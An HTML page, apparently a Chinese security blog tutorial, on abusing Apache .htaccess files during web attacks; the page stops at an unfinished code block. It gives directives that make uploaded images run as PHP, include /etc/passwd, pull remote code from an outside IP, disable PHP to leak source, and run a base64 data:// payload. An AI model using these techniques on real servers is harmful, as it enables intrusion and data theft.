@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Apache的.htaccess利用技巧 参考：Apache的.htaccess利用技巧-先知社区\n作用范围 .htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n">
+<title>Apache的.htaccess利用技巧</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="Apache的.htaccess利用技巧">
+<meta property='og:description' content="Apache的.htaccess利用技巧 参考：Apache的.htaccess利用技巧-先知社区\n作用范围 .htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='.htaccess' /><meta property='article:published_time' content='2025-04-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png' />
+<meta name="twitter:title" content="Apache的.htaccess利用技巧">
+<meta name="twitter:description" content="Apache的.htaccess利用技巧 参考：Apache的.htaccess利用技巧-先知社区\n作用范围 .htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#作用范围">作用范围</a></li>
+    <li><a href="#配置文件">配置文件</a></li>
+    <li><a href="#常见指令">常见指令</a>
+      <ol>
+        <li><a href="#sethandler">SetHandler</a></li>
+        <li><a href="#addhandler">AddHandler</a></li>
+        <li><a href="#addtype">AddType</a></li>
+        <li><a href="#php_value">php_value</a></li>
+        <li><a href="#php_flag">php_flag</a></li>
+      </ol>
+    </li>
+    <li><a href="#利用方式">利用方式</a>
+      <ol>
+        <li><a href="#文件解析">文件解析</a></li>
+        <li><a href="#文件包含">文件包含</a>
+          <ol>
+            <li><a href="#本地文件包含">本地文件包含</a></li>
+            <li><a href="#远程文件包含">远程文件包含</a></li>
+          </ol>
+        </li>
+        <li><a href="#源码泄露">源码泄露</a></li>
+        <li><a href="#代码执行">代码执行</a></li>
+        <li><a href="#命令执行">命令执行</a>
+          <ol>
+            <li><a href="#cgi启动">CGI启动</a></li>
+            <li><a href="#fastcgi启动">FastCGI启动</a></li>
+          </ol>
+        </li>
+        <li><a href="#xss">XSS</a>
+          <ol>
+            <li><a href="#highlight_file">highlight_file</a></li>
+            <li><a href="#错误消息链接">错误消息链接</a></li>
+            <li><a href="#自定义错误文件">自定义错误文件</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">
+                <img src="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png"
+                        
+                        width="879" 
+                        height="1111" 
+                        loading="lazy"
+                        alt="Featured image of post Apache的.htaccess利用技巧" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/php/" style="background-color: #2a9d8f; color: #fff;">
+                Php
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">Apache的.htaccess利用技巧</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 06, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="apache的htaccess利用技巧">Apache的.htaccess利用技巧
+</h1><p>参考：<a class="link" href="https://xz.aliyun.com/news/7862?time__1311=WqjhqGxAx0hGCDlh%2BG7DyADulfzGQQssHF4D&amp;u_atoken=ddb4fb5b0810e3bfa6842bab09841ce4&amp;u_asig=0a47319217439111247588601e003e"  target="_blank" rel="noopener"
+    >Apache的.htaccess利用技巧-先知社区</a></p>
+<h2 id="作用范围">作用范围
+</h2><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 <code>.htaccess</code> 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 <code>.htaccess</code> 文件中的指令可能会覆盖其上级目录中的 <code>.htaccess</code> 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
+<h2 id="配置文件">配置文件
+</h2><p>启动 <code>.htaccess</code>，需要在服务器的主配置文件将 <code>AllowOverride</code> 设置为 <code>All</code>，如 apache2.conf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AllowOverride All  #启动.htaccess文件的使用
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以将 <code>.htaccess</code> 修改为其他名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AccessFileName .config #将.htaccess修改为.config
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="常见指令">常见指令
+</h2><p>具体功能可以看http://www.htaccess-guide.com/</p>
+<h3 id="sethandler">SetHandler
+</h3><p><code>SetHandler</code> 可以强制所有匹配的文件被一个指定的处理器处理
+用法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SetHandler handler-name|None
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>示例1：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时当前目录及其子目录下所有文件都会被当做 <code>php</code> 解析</p>
+<p>示例2：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SetHandler server-status
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录</p>
+<p>访问任意不存在的文件，加参数 <code>?refresh=5</code> 来实现每隔 5s 自动刷新</p>
+<p>比如<code>sever?refresh=5</code></p>
+<h3 id="addhandler">AddHandler
+</h3><p><code>AddHandler</code> 可以在文件扩展名与特定的处理器之间建立映射
+用法:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddHandler handler-name extension [extension] ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddHandler cgi-script .xxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将扩展名为 <code>.xxx</code> 的文件作为 <code>CGI</code> 脚本来处理</p>
+<h3 id="addtype">AddType
+</h3><p><code>AddType</code> 可以将给定的文件扩展名映射到指定的内容类型
+用法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType media-type extension [extension] ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType application/x-httpd-php .gif
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将以 <code>gif</code> 为后缀的文件当做 <code>php</code> 解析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType application/x-httpd-php png  jpg gif
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将以 <code>.png .jpg .gif</code> 多个后缀当做 <code>php</code> 解析</p>
+<h3 id="php_value">php_value
+</h3><p>当使用 <code>PHP</code> 作为 <code>Apache</code> 模块时，也可以用 <code>Apache</code> 的配置文件（例如 <code>httpd.conf</code>）和 <code>.htaccess</code> 文件中的指令来修改 <code>php</code> 的配置设定。需要有<code>AllowOverride Options</code> 或<code>AllowOverride All</code> 权限才可以。</p>
+<p><code>php_value</code> 设定指定的值。要清除先前设定的值，把 <code>value</code> 设为 <code>none</code>。不要用 <code>php_value</code> 设定布尔值。应该用 <code>php_flag</code>。</p>
+<p>用法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value name value
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.php.net/manual/zh/configuration.changes.modes.php"  target="_blank" rel="noopener"
+    >PHP: 配置可被设定范围 - Manual</a></p>
+<p>由上可知 <code>.htaccess</code> 只能用于 <code>PHP_INI_ALL</code> 或 <code>PHP_INI_PERDIR</code> 类型的指令。</p>
+<p><a class="link" href="https://www.php.net/manual/zh/ini.list.php"  target="_blank" rel="noopener"
+    >PHP: php.ini 配置选项列表 - Manual</a></p>
+<p>可以找到可用指令</p>
+<p>(1) 文件包含配置选项</p>
+<ul>
+<li>auto_prepend_file：在主文件解析之前自动解析包含的文件</li>
+<li>auto_append_file：在主文件解析后自动解析包含的文件</li>
+</ul>
+<p>例如:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file images.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问一个 <code>php</code> 文件时，在该文件解析之前会先自动解析 images.png 文件</p>
+<p>(2) 绕过preg_match</p>
+<p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value pcre.backtrack_limit 0
+</span></span><span class="line"><span class="cl">php_value pcre.jit 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。</p>
+<h3 id="php_flag">php_flag
+</h3><p><code>php_flag</code> 用来设定布尔值的 <code>php</code> 配置指令
+用法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_flag name on|off
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.php.net/manual/zh/ini.list.php"  target="_blank" rel="noopener"
+    >PHP: php.ini 配置选项列表 - Manual</a></p>
+<p>找到可用指令</p>
+<p>可以将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_flag engine 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="利用方式">利用方式
+</h2><h3 id="文件解析">文件解析
+</h3><p>经常出现在文件上传的黑名单没有限制 <code>.htaceess</code> 后缀，通过上传 <code>.htaccess</code> 文件，再上传图片，使图片的 <code>php</code> 恶意代码得以被解析执行</p>
+<p><code>.htaccess</code> 文件内容有如下两种</p>
+<p>1.<code>SetHandler</code> 指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 将images.png 当做 PHP 执行
+</span></span><span class="line"><span class="cl">&lt;FilesMatch  &#34;images.png&#34;&gt;
+</span></span><span class="line"><span class="cl">SetHandler  application/x-httpd-php
+</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.<code>AddType</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 将 .jpg 当做 PHP 文件解析
+</span></span><span class="line"><span class="cl">AddType application/x-httpd-php .jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="文件包含">文件包含
+</h3><h4 id="本地文件包含">本地文件包含
+</h4><p>通过 <code>php_value</code> 来设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 <code>php</code> 文件来触发。</p>
+<p><code>.htaccess</code> 分别通过这两个配置选项来包含 <code>/etc/passwd</code>,并访问同目录下的 <code>index.php</code>文件。</p>
+<p><code>auto_prepend_file</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_file /etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>auto_append_file</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_append_file /etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="远程文件包含">远程文件包含
+</h4><p>PHP 的 <code>all_url_include</code> 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 <code>all_url_include</code> 的配置范围为 <code>PHP_INI_SYSTEM</code>,所以无法利用 <code>php_flag</code> 在 <code>.htaccess</code> 中开启。</p>
+<p>在 <code>php.ini</code> 中设置 <code>all_url_include</code> 为 <code>On</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_append_file http://10.87.9.156/phpinfo.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后访问目录下php文件后就会出现phpinfo</p>
+<h3 id="源码泄露">源码泄露
+</h3><p>利用 <code>php_flag</code> 将 <code>engine</code> 设置为 0,在本目录和子目录中关闭 <code>php</code> 解析,造成源码泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_flag engine 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码</p>
+<h3 id="代码执行">代码执行
+</h3><p>1.利用伪协议
+<code>all_url_fopen</code>、<code>all_url_include</code> 为 <code>On</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
+</span></span><span class="line"><span class="cl">#php_value auto_append_file data://text/plain,&lt;?php phpinfo();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.解析<code>.htaccess</code>
+方法一：</p>
+<div class="highlight"><div class="chroma">
